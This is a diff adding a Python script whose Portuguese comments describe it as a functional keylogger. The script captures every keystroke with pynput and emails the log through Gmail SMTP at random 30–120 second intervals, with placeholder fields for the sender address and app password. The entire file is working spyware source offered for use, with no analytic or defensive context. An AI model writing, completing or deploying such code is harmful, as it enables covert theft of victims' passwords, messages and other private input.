@@ -1,0 +1,66 @@
+#SCRIPT ABAIXO IMPLEMENTA UM KEYLOGGER FUNCIONAL QUE ENVIA OS DADOS PARA UM ENDEREÇO DE E-MAIL EM TEMPOS 
+#"ALEATÓRIOS" USANDO O MÉTODO RANDOM
+
+import random
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+
+log = ""
+
+#DADOS DE ACESSO
+EMAIL_ORIGEM = "coloque_seu_email"
+EMAIL_DESTINO = "coloque_seu_email"
+SENHA_EMAIL = "coloque_a_senha_gerada_no_apppassword_da_sua_conta"
+
+#FUNÇÃO QUE CRIA O CORPO E CABEÇALHO DO E-MAIL E ENVIA VIA TLS PARA UMA CONTA GMAIL
+def enviar_email():
+    global log
+
+    tempo = random.randint(30, 120)  # tempo randômico a cada execução
+
+    if log:
+        msg = MIMEText(log)
+        msg['Subject'] = "Dados capturados pelo keylogger."
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+
+        try:
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+            server.send_message(msg)
+            print("Enviado! Próximo envio em:", tempo, "segundos")
+            server.quit()
+        except Exception as e:
+            print("Erro ao enviar o email!", e)
+
+        log = ""
+
+    # REAGENDA COM UM NOVO TEMPO ALEATÓRIO O TIMER
+    Timer(tempo, enviar_email).start()
+
+
+#DEFINE QUAIS TECLAS DEVEM SER SUBSTITUÍDAS PARA DEIXAR O LOG MAIS LEGÍVEL
+def on_press(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.tab:
+            log += "\t"
+        elif key == keyboard.Key.backspace:
+            log += "[<]"
+
+
+# INÍCIO DO PROCESSO
+enviar_email()
+
+#LISTENER QUE ESCUTA TUDO QUE É DIGITADO NO TECLADO
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
